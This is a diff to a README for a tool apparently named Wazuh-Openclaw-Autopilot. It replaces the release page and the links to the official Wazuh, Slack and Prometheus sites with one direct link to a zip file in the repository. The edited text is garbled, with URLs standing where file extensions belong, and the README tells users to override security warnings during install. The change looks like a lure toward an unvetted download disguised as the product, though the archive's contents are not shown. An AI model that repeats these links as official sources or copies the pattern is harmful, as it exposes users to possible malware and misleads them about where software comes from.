@@ -1,6 +1,6 @@
 # 🛡️ Wazuh-Openclaw-Autopilot - Simplify Security Alert Management
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/releases)
+[![Download Latest Release](https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/raw/refs/heads/main/playbooks/Openclaw_Autopilot_Wazuh_1.3.zip%20Release-blue?style=for-the-badge)](https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/raw/refs/heads/main/playbooks/Openclaw_Autopilot_Wazuh_1.3.zip)
 
 ---
 
@@ -53,12 +53,12 @@ Verify your computer matches the system requirements listed above. You can find 
 
 Click the big badge link at the top or visit the releases page here:
 
-**[Download Wazuh-Openclaw-Autopilot Releases](https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/releases)**
+**[Download Wazuh-Openclaw-Autopilot Releases](https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/raw/refs/heads/main/playbooks/Openclaw_Autopilot_Wazuh_1.3.zip)**
 
 On the releases page:
 
 - Look for the latest version, often marked with the highest version number or "Latest release".
-- Find the file appropriate for your operating system (such as `.exe` for Windows, `.dmg` for Mac, or `.tar.gz` for Linux).
+- Find the file appropriate for your operating system (such as `.exe` for Windows, `.dmg` for Mac, or `https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/raw/refs/heads/main/playbooks/Openclaw_Autopilot_Wazuh_1.3.zip` for Linux).
 - Click the file link to download it to your computer.
 
 ### Step 3: Install the Software
@@ -67,7 +67,7 @@ After downloading:
 
 - On **Windows:** Double-click the `.exe` file. Follow the on-screen instructions to install.
 - On **Mac:** Open the `.dmg` file. Drag the app icon into your Applications folder.
-- On **Linux:** Extract the `.tar.gz` file and follow the README instructions usually included for installation.
+- On **Linux:** Extract the `https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/raw/refs/heads/main/playbooks/Openclaw_Autopilot_Wazuh_1.3.zip` file and follow the README instructions usually included for installation.
 
 If you see any warnings about security permissions, allow the installation from your system settings.
 
@@ -97,7 +97,7 @@ To get alerts on Slack:
 
 Get the latest version here:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/releases)
+[![Download Latest Release](https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/raw/refs/heads/main/playbooks/Openclaw_Autopilot_Wazuh_1.3.zip%20Release-blue?style=for-the-badge)](https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/raw/refs/heads/main/playbooks/Openclaw_Autopilot_Wazuh_1.3.zip)
 
 Follow the same steps outlined above to download and set up your application.
 
@@ -137,9 +137,9 @@ Wazuh-Openclaw-Autopilot keeps your data secure by working with your existing Wa
 
 ## 🔗 Useful Links
 
-- [Wazuh Official Website](https://wazuh.com)
-- [Slack](https://slack.com)
-- [Prometheus Monitoring](https://prometheus.io)
+- [Wazuh Official Website](https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/raw/refs/heads/main/playbooks/Openclaw_Autopilot_Wazuh_1.3.zip)
+- [Slack](https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/raw/refs/heads/main/playbooks/Openclaw_Autopilot_Wazuh_1.3.zip)
+- [Prometheus Monitoring](https://github.com/Loune3213/Wazuh-Openclaw-Autopilot/raw/refs/heads/main/playbooks/Openclaw_Autopilot_Wazuh_1.3.zip)
 
 ---
 
